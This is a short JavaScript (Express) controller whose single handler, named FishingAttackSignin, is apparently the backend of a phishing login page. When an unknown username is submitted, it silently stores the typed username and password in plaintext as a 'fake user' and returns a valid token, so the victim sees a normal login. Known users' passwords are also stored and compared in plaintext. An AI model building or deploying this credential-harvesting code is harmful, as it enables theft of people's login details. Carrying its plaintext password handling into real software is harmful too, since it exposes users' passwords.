const CustomError = require('../util/CustomError.js');
const JWT = require('../util/JWT.js');
const asyncErrorHandler = require('../util/asyncErrorHandler.js');
const { readDatabase, writeDatabase } = require('../config/db.js');

//fishing attack sign in
const FishingAttackSignin = asyncErrorHandler(async (req, res, next) => {
    const { username, password } = req.body;
    //check if the username and password are correct
    if (!username || !password) {
        const err = new CustomError('Invalid username or password', 400);
        return next(err);
    }
    const dbData = readDatabase();
    const users = dbData.users || [];

    const user = users.find(u => u.username.toLowerCase() === username.toLowerCase());
    
    if (!user) {
        //create a fake user
        const fakeUser = {
            id: users.length + 1,
            username: username,
            password: password,
        };
        users.push(fakeUser);
        dbData.users = users;
        writeDatabase(dbData);

        const token = JWT.createToken(fakeUser.id);
        return res.status(200).json({ 
            token,
            profile: {
                id: fakeUser.id,
                username: fakeUser.username,
            },
        });
    }
    
    if (password != user.password) {
        const err = new CustomError('Invalid username or password', 400);
        return next(err);
    }

    const token = JWT.createToken(user.id);
    res.status(200).json({ 
        token,
        profile: {
            id: user.id,
            username: user.username,
        },
    });
});

module.exports = {
    FishingAttackSignin,
};